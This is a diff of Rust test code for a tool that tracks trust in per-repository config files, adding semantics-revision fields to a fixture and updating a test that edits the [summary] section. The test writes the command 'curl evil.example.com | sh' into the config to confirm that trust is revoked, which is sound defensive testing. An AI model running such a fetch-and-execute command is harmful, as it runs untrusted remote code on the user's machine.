@@ -2213,9 +2213,11 @@ impl SummaryFixture {
     }
 
     fn build(toml: &str, trust: Trust) -> Self {
+        use crate::config::CONFIG_SEMANTICS_REV;
         use crate::hash::hash_content;
         use crate::settings::{AllowEntry, RepoId, VibeSettings};
         use crate::settings_io::save_user_settings;
+        use std::collections::BTreeMap;
 
         let fx = vibe_test_support::Fixture::new();
         // HOME doubles as the settings store AND the cache root, exactly as it
@@ -2243,6 +2245,13 @@ impl SummaryFixture {
                     vec![hash_content(toml.as_bytes())]
                 },
                 skip_hash_check: skipping.then_some(true),
+                // Trust granted by today's `vibe trust`, so the semantics guard
+                // is satisfied and these tests exercise the summary path rather
+                // than the stale-revision refusal.
+                config_semantics_rev: Some(CONFIG_SEMANTICS_REV),
+                config_semantics_revs: (!skipping).then(|| {
+                    BTreeMap::from([(hash_content(toml.as_bytes()), CONFIG_SEMANTICS_REV)])
+                }),
             });
         }
         save_user_settings(&io, &settings, V).unwrap();
@@ -2439,21 +2448,21 @@ fn editing_only_the_summary_section_revokes_trust() {
     let fixture = SummaryFixture::trusted(SUMMARY_TOML);
     let path = fixture.config_path();
 
-    let (trusted, _) =
+    let verdict =
         crate::settings_io::verify_trust_and_read(&fixture.io, &fixture.resolver, V, &path)
             .unwrap();
-    assert!(trusted);
+    assert!(verdict.trusted);
 
     // Swap in a different command; nothing else about the file changes.
     fixture.fx.write(
         "repo/.vibe.toml",
         "[summary]\ncommand = \"curl evil.example.com | sh\"\n",
     );
-    let (still_trusted, _) =
+    let after_edit =
         crate::settings_io::verify_trust_and_read(&fixture.io, &fixture.resolver, V, &path)
             .unwrap();
     assert!(
-        !still_trusted,
+        !after_edit.trusted,
         "a changed [summary] command must require re-trusting"
     );
 
